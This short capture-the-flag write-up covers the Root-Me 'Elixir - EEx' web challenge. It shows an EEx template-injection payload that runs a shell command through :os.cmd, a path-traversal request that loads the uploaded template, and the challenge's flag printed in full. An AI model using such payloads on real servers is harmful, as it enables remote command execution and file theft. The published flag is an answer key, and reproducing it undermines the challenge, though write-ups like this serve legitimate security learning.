## Challenge name: Elixir - EEx

``` Challenge Link:``` [https://www.root-me.org/en/Challenges/Web-Server/Elixir-EEx](https://www.root-me.org/en/Challenges/Web-Server/Elixir-EEx)

**After we start the challenge we can see that source code was given. It uses Elixir with EEx templating.**

**Upload a .eex file with template code: `<%= :os.cmd('cat ./flag.txt') %>`**

**Access it via path traversal: `?page=../../uploads/<GENERATED_FILENAME>`**

**Got the flag.txt contents and can use this "RM{EEx_C@n_b3_DanGeR0u$:)!}" as flag/passwd to validate the challenge..**

**Thankyou.**
